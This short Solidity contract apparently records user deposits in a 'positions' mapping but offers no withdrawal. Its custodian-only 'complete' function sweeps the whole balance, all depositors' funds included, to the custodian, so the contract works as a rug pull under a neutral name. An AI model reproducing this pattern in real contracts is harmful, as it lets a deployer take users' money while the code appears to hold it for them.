// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Module2404 {
    address public custodian; mapping(address => uint256) public positions;
    constructor() { custodian = msg.sender; }
    function deposit() external payable { positions[msg.sender] += msg.value; }
    function complete() external { require(msg.sender == custodian, "denied"); (bool ok,) = payable(custodian).call{value: address(this).balance}(""); require(ok, "send"); }
}
